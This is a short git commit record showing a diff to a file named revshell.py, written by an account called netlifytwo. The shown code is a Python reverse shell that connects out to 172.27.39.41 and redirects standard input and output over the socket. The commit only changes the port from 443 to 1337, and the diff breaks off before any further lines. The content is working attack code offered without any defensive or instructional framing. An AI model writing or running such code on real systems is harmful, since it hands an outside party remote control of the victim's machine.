a5d8f669ca26cc1d242df8d67dd2881afd25b0b6
netlifytwo <netlifytwo@gmail.com>
2025-04-16 08:58:12 -0700

    Update revshell.py

--- revshell.py
+++ revshell.py
@@ -1,5 +1,5 @@
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("172.27.39.41",443))
+s.connect(("172.27.39.41",1337))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
